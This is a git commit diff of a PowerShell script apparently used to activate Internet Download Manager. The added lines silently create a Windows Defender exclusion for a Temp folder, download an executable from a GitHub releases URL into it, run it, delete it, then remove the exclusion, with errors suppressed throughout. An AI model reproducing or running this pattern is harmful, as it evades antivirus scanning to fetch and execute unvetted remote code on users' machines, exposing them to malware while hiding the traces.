161a440a610a43f7ec51971fd461d1ef26931a8a
ghostminhtoan <ghostminhtoan@gmail.com>
2025-09-09 21:26:17 +0700

    Update mmtidmactive.ps1

--- mmtidmactive.ps1
+++ mmtidmactive.ps1
@@ -1,8 +1,16 @@
+# Thêm exclusion (không hiển thị chi tiết)
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp\MMTPC" -Force -ErrorAction SilentlyContinue
+
 # Tải và chạy file
-$filePath = "$env:USERPROFILE\AppData\Local\Temp\MMT.PE.exe"
+$filePath = "$env:USERPROFILE\AppData\Local\Temp\MMTPC\MMT.PE.exe"
 Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue
 
 if (Test-Path $filePath) {
     Start-Process -FilePath $filePath -Wait
     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 }
+
+# Xóa exclusion (không hiển thị chi tiết)
+Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp\MMTPC" -Force -ErrorAction SilentlyContinue
+
+
